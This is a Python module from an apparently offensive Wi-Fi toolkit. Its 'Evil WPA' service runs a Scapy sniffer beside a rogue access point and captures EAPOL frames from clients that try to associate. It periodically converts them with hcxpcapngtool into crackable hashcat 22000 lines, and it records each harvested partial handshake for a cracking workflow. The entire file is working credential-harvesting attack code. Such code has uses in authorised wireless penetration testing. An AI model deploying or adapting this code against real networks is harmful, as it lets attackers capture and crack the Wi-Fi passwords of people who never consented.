"""Evil WPA — EAPOL sniffer + partial-handshake harvest.

When PineAP runs in WPA2 mode (security_mode=wpa2), this service runs
a parallel Scapy sniffer on the karma radio (wlan-mon-5g, the same one
we use for Karma — only one is active at a time). It captures every
802.11 frame on the rogue AP's channel that's relevant to a WPA
association attempt: management frames (auth/assoc/deauth) involving
our BSSID, plus EAPOL data frames.

Every ``_EXTRACT_INTERVAL`` seconds (and on stop) we hand the
accumulated pcap to ``hcxpcapngtool`` from the S08 wrapper, which
parses out M1+M2 pairs and emits a ``.22000`` line per crackable
partial. New partials are tracked in self._partials for the UI; the
S12 Routes/UI task (#112) and S12 Handshakes integration (#113) wire
these into the existing Handshakes page so they get the same Crack
dispatch flow as recon captures.

Why this approach (sniff-and-convert rather than parse-in-process):

* hcxpcapngtool already handles every edge case of WPA handshake
  validation — M1+M2 vs M2+M3 pairs, key descriptor version
  variations, MFP-protected variants, the nonce/MIC bookkeeping. We
  built the wrapper in S07.5/S08 and validated it on real captures.
  Re-implementing that logic in Python would be brittle.
* Scapy's sniff() is reliable on mt76 monitor interfaces in our
  current kernel; we proved this with Karma's probe-request sniffer.
* The pcap is the audit trail. Operator can download it from
  Handshakes page and re-analyse with Wireshark or run their own
  tools against it.

Stub mode (Mac dev): no actual Scapy injection or hcxpcapngtool
invocation; the lifecycle flips state and the stats reflect that
nothing real happened.
"""

from __future__ import annotations

import json
import logging
import threading
import time
import uuid
from pathlib import Path
from typing import Any

from app.tools._common import stub_mode

log = logging.getLogger(__name__)


# ---------- Tuning ----------

# How often to run hcxpcapngtool on the in-flight pcap to look for new
# partials. Cheap operation (pcap is small, conversion is fast). 30s
# means an operator sees the first capture surface in the UI quickly
# without us hammering CPU.
_EXTRACT_INTERVAL = 30.0

# pcap rolling cap. If a single session collects more than this, we
# rotate (current pcap renamed to .<n>, fresh one started). Prevents
# unbounded growth on a long-running session with lots of traffic.
_PCAP_ROTATE_BYTES = 20 * 1024 * 1024


# ---------- The service ----------

class EvilWpaService:
    def __init__(self, data_dir: Path) -> None:
        self._data_dir = data_dir
        # Reuse the handshakes/ directory for storage — partials we
        # extract are first-class captures and live next to recon
        # captures, just with source="Evil WPA" in the index. The
        # actual index update happens via the handshakes service in
        # task #113; we just write the pcap + .22000 here and surface
        # via self.list_partials() for now.
        self._evil_wpa_dir = data_dir / "evil_wpa"
        self._lock = threading.Lock()
        # Threads
        self._sniffer_thread: threading.Thread | None = None
        self._extractor_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        # Session config (set on start)
        self._iface: str | None = None
        self._channel: int | None = None
        self._ap_bssid: str | None = None
        self._ssid: str | None = None
        self._session_id: str | None = None
        self._session_dir: Path | None = None
        self._pcap_path: Path | None = None
        self._pcap_writer: Any | None = None    # scapy.utils.PcapWriter
        self._pcap_lock = threading.Lock()      # _on_frame is multi-threaded
        # Per-session stats
        self._stats: dict[str, Any] = {
            "frames_seen":        0,
            "eapol_seen":         0,
            "extract_runs":       0,
            "partials_extracted": 0,
            "pcap_bytes":         0,
            "started_at":         None,
            "stopped_at":         None,
        }
        # Partials harvested in this session: list of dicts with
        # {id, pcap_path, hash_22000_path, bssid, essid, extracted_at, line_count}
        self._partials: list[dict[str, Any]] = []

    # ---------- Public ----------
    def is_running(self) -> bool:
        return (self._sniffer_thread is not None
                and self._sniffer_thread.is_alive())

    def get_stats(self) -> dict[str, Any]:
        with self._lock:
            return {
                "running":            self.is_running(),
                "iface":              self._iface,
                "channel":            self._channel,
                "ap_bssid":           self._ap_bssid,
                "ssid":               self._ssid,
                "session_id":         self._session_id,
                "frames_seen":        self._stats["frames_seen"],
                "eapol_seen":         self._stats["eapol_seen"],
                "extract_runs":       self._stats["extract_runs"],
                "partials_extracted": self._stats["partials_extracted"],
                "pcap_bytes":         self._stats["pcap_bytes"],
                "started_at":         self._stats["started_at"],
                "stopped_at":         self._stats["stopped_at"],
            }

    def list_partials(self) -> list[dict[str, Any]]:
        """All partials harvested in the current/last session."""
        with self._lock:
            return [dict(p) for p in self._partials]

    def start(
        self, iface: str, channel: int, ap_bssid: str, ssid: str,
    ) -> tuple[bool, str]:
        """Bind to ``iface`` (monitor mode), lock to ``channel`` (must
        match hostapd's), start the EAPOL sniffer + periodic
        extractor. Caller (pineap._start_broadcast) is responsible
        for ensuring iface is monitor-mode and recon has been paused
        on it — same coordination as Karma.

        Stub mode just flips lifecycle state without touching the
        radio."""
        with self._lock:
            if self.is_running():
                return True, f"already running on {self._iface}"
            self._iface    = iface
            self._channel  = int(channel)
            self._ap_bssid = ap_bssid.lower()
            self._ssid     = ssid
            self._session_id = uuid.uuid4().hex[:12]
            self._session_dir = self._evil_wpa_dir / f"{self._session_id}"
            self._session_dir.mkdir(parents=True, exist_ok=True)
            self._pcap_path = self._session_dir / "capture.pcapng"
            self._partials = []
            # Reset stats for this session
            self._stop_event.clear()
            self._stats.update({
                "frames_seen":        0,
                "eapol_seen":         0,
                "extract_runs":       0,
                "partials_extracted": 0,
                "pcap_bytes":         0,
                "started_at":         time.time(),
                "stopped_at":         None,
            })

        # Lock the interface to the rogue AP's channel before sniffing
        if not stub_mode():
            try:
                from app.tools import iw
                ok, msg = iw.set_channel(iface, self._channel)
                if not ok:
                    log.warning("evil_wpa: set_channel %s ch%d failed: %s",
                                iface, self._channel, msg)
            except Exception:
                log.exception("evil_wpa: iw.set_channel raised")

        try:
            from flask import current_app
            app = current_app._get_current_object()
        except Exception:
            app = None

        def _run_sniffer() -> None:
            ctx = app.app_context() if app is not None else None
            if ctx:
                ctx.push()
            try:
                if stub_mode():
                    log.info("evil_wpa: (stub) sniffer would bind to %s ch%d",
                             iface, self._channel)
                    while not self._stop_event.is_set():
                        self._stop_event.wait(1.0)
                else:
                    self._sniff_loop()
            except Exception:
                log.exception("evil_wpa sniffer crashed")
            finally:
                if ctx:
                    ctx.pop()

        def _run_extractor() -> None:
            ctx = app.app_context() if app is not None else None
            if ctx:
                ctx.push()
            try:
                while not self._stop_event.is_set():
                    self._stop_event.wait(_EXTRACT_INTERVAL)
                    if self._stop_event.is_set():
                        break
                    try:
                        self._extract_partials()
                    except Exception:
                        log.exception("evil_wpa extractor tick failed")
            finally:
                if ctx:
                    ctx.pop()

        t_sniff = threading.Thread(target=_run_sniffer,
                                   name=f"evil-wpa-sniff-{iface}",
                                   daemon=True)
        t_extract = threading.Thread(target=_run_extractor,
                                     name=f"evil-wpa-extract-{self._session_id}",
                                     daemon=True)
        with self._lock:
            self._sniffer_thread = t_sniff
            self._extractor_thread = t_extract
        t_sniff.start()
        t_extract.start()
        log.info("evil_wpa: listening on %s ch%d for AP %s (%r) session=%s",
                 iface, self._channel, self._ap_bssid, self._ssid,
                 self._session_id)
        return True, (f"evil_wpa listening on {iface} ch{self._channel} "
                      f"for {self._ap_bssid} ({self._ssid!r}) "
                      f"session={self._session_id}")

    def stop(self) -> tuple[bool, str]:
        with self._lock:
            if not self.is_running():
                return True, "already stopped"
            self._stop_event.set()
            self._stats["stopped_at"] = time.time()

        # Wait for both threads to exit so callers can free the radio
        for t in (self._sniffer_thread, self._extractor_thread):
            if t is not None:
                t.join(timeout=3.0)

        # Final extraction in case anything landed in the pcap after
        # the last periodic run
        try:
            self._extract_partials()
        except Exception:
            log.exception("evil_wpa: final extraction failed")

        # Close the pcap writer cleanly
        with self._pcap_lock:
            if self._pcap_writer is not None:
                try:
                    self._pcap_writer.close()
                except Exception:
                    log.exception("evil_wpa: pcap writer close failed")
                self._pcap_writer = None

        with self._lock:
            stale_sniffer = self._sniffer_thread
            stale_extractor = self._extractor_thread
            self._sniffer_thread = None
            self._extractor_thread = None
        if stale_sniffer is not None and stale_sniffer.is_alive():
            log.warning("evil_wpa sniffer didn't exit within 3s — leaked")
        if stale_extractor is not None and stale_extractor.is_alive():
            log.warning("evil_wpa extractor didn't exit within 3s — leaked")
        return True, "stopped"

    # ---------- Sniffer ----------
    def _sniff_loop(self) -> None:
        """Scapy sniff filtered to frames involving our AP_BSSID.

        We capture:
          * 802.11 mgmt frames (type=0) where our BSSID is in any
            address field — auth, assoc, reassoc, deauth, disassoc,
            and our own beacons. Gives hcxpcapngtool the SSID context
            it needs.
          * 802.11 data frames (type=2) that carry EAPOL payloads
            (LLC SNAP ethertype 0x888e), involving our BSSID. These
            are the M1, M2, M3, M4 frames we actually want.
        """
        from scapy.sendrecv import sniff
        try:
            sniff(
                iface=self._iface,
                prn=self._on_frame,
                store=False,
                stop_filter=lambda _pkt: self._stop_event.is_set(),
                lfilter=lambda pkt: self._is_relevant(pkt),
            )
        except OSError as e:
            log.error("evil_wpa sniff bind failed on %s: %s",
                      self._iface, e)
        except Exception:
            log.exception("evil_wpa sniff loop")

    def _is_relevant(self, pkt) -> bool:
        try:
            from scapy.layers.dot11 import Dot11
            from scapy.layers.eap import EAPOL
        except ImportError:
            return False
        if not pkt.haslayer(Dot11):
            return False
        d11 = pkt.getlayer(Dot11)
        if d11.type not in (0, 2):    # 0=mgmt, 2=data; skip 1=control
            return False
        # Address check: any address field matches our BSSID
        ap = (self._ap_bssid or "").lower()
        if not ap:
            return False
        addrs = [(d11.addr1 or "").lower(),
                 (d11.addr2 or "").lower(),
                 (d11.addr3 or "").lower()]
        if ap not in addrs:
            return False
        # For data frames, only keep EAPOL
        if d11.type == 2 and not pkt.haslayer(EAPOL):
            return False
        return True

    def _on_frame(self, pkt) -> None:
        """Per-frame callback. Write to pcap; update stats."""
        try:
            from scapy.layers.eap import EAPOL
        except ImportError:
            return
        with self._pcap_lock:
            if self._pcap_writer is None:
                self._open_pcap_writer()
            try:
                self._pcap_writer.write(pkt)
                self._pcap_writer.flush()
            except Exception:
                log.exception("evil_wpa: pcap write failed")
                return
        with self._lock:
            self._stats["frames_seen"] += 1
            if pkt.haslayer(EAPOL):
                self._stats["eapol_seen"] += 1
            try:
                self._stats["pcap_bytes"] = self._pcap_path.stat().st_size
            except OSError:
                pass
        # Rotation check — cheap stat() per frame is fine
        if self._stats["pcap_bytes"] > _PCAP_ROTATE_BYTES:
            self._rotate_pcap()

    def _open_pcap_writer(self) -> None:
        """Open a fresh pcap writer. Caller holds self._pcap_lock."""
        from scapy.utils import PcapWriter
        self._pcap_writer = PcapWriter(
            str(self._pcap_path),
            append=True,
            sync=True,
            linktype=127,        # LINKTYPE_IEEE802_11_RADIOTAP
        )

    def _rotate_pcap(self) -> None:
        """Cap pcap size by archiving the current file and starting fresh.
        On stop the extractor will run against both files."""
        with self._pcap_lock:
            if self._pcap_writer is None or self._pcap_path is None:
                return
            try:
                self._pcap_writer.close()
            except Exception:
                pass
            self._pcap_writer = None
            try:
                rolled = self._session_dir / f"capture.{int(time.time())}.pcapng"
                self._pcap_path.rename(rolled)
                log.info("evil_wpa: rotated pcap → %s", rolled)
            except OSError:
                log.exception("evil_wpa: rotate failed")
        with self._lock:
            self._stats["pcap_bytes"] = 0

    # ---------- Extractor ----------
    def _extract_partials(self) -> None:
        """Run hcxpcapngtool on the current pcap (and any rotated
        pcaps in the session dir) and register new partials. Idempotent
        — re-running won't duplicate already-known entries."""
        if stub_mode() or self._session_dir is None:
            return
        with self._lock:
            self._stats["extract_runs"] += 1

        from app.tools.hcxpcapngtool import convert_to_22000

        # Find all pcap(ng) files in the session dir
        pcaps = sorted(self._session_dir.glob("capture*.pcap*"))
        if not pcaps:
            return

        # Combined output file. Each run overwrites — if a previous run
        # captured 3 partials and this run captures 5, the new file has
        # 5 lines (the 3 originals plus 2 new). We diff against
        # self._partials to register only the truly new ones.
        out_22000 = self._session_dir / "all.22000"

        # hcxpcapngtool can take multiple input files. Easiest is to
        # let scapy concatenate them — but the wrapper currently takes
        # one pcap path. For the multi-file case (after rotation),
        # we'd need an enhancement. For S12's first cut, just convert
        # the most-recent (active) pcap and accept that we'll re-extract
        # only from the current one. Rotation in a single session is
        # rare in practice.
        active_pcap = pcaps[-1]
        ok, msg, counts = convert_to_22000(active_pcap, out_22000)
        if not ok:
            log.debug("evil_wpa: convert_to_22000 returned not-ok: %s", msg)
            return

        # Read the .22000 output. Each line is one crackable target.
        try:
            lines = [ln.strip() for ln in out_22000.read_text().splitlines()
                     if ln.strip()]
        except OSError:
            log.exception("evil_wpa: reading %s failed", out_22000)
            return

        # Track already-known partials by line content (the .22000
        # line is the natural unique key — it encodes everything about
        # the partial). Anything new gets a fresh record.
        with self._lock:
            known_lines = {p.get("hash_line") for p in self._partials}
        new_count = 0
        for line in lines:
            if line in known_lines:
                continue
            partial = self._build_partial_record(line, active_pcap, out_22000)
            with self._lock:
                self._partials.append(partial)
                self._stats["partials_extracted"] += 1
            new_count += 1
            log.info("evil_wpa: harvested partial — %s (line=%s...)",
                     partial.get("id"), line[:50])
            self._emit_partial(partial)
        if new_count:
            log.info("evil_wpa: %d new partial(s) this extract run", new_count)

    def _build_partial_record(self, hash_line: str, pcap_path: Path,
                              hash_path: Path) -> dict[str, Any]:
        # 22000 line format: WPA*<type>*<mic_or_pmkid>*<MAC_AP>*<MAC_STA>*
        # <ESSID_hex>*<ANONCE>*<EAPOL>*<flags>
        parts = hash_line.split("*")
        ap_mac = parts[3] if len(parts) > 3 else self._ap_bssid
        sta_mac = parts[4] if len(parts) > 4 else None
        essid_hex = parts[5] if len(parts) > 5 else None
        essid = None
        if essid_hex:
            try:
                essid = bytes.fromhex(essid_hex).decode("utf-8", errors="replace")
            except ValueError:
                essid = essid_hex
        return {
            "id":             uuid.uuid4().hex,
            "session_id":     self._session_id,
            "hash_line":      hash_line,
            "pcap_path":      str(pcap_path),
            "hash_22000_path": str(hash_path),
            "ap_mac":         ap_mac,
            "sta_mac":        sta_mac,
            "essid":          essid or self._ssid,
            "extracted_at":   time.time(),
            "source":         "Evil WPA",
        }

    def _emit_partial(self, partial: dict[str, Any]) -> None:
        try:
            from app import socketio
            socketio.emit("evil_wpa:partial", partial, namespace="/")
        except Exception:
            pass


# ---------- Module singleton ----------

_service: "EvilWpaService | None" = None


def get_service() -> EvilWpaService:
    global _service
    if _service is None:
        from flask import current_app
        _service = EvilWpaService(current_app.config["DATA_DIR"])
    return _service
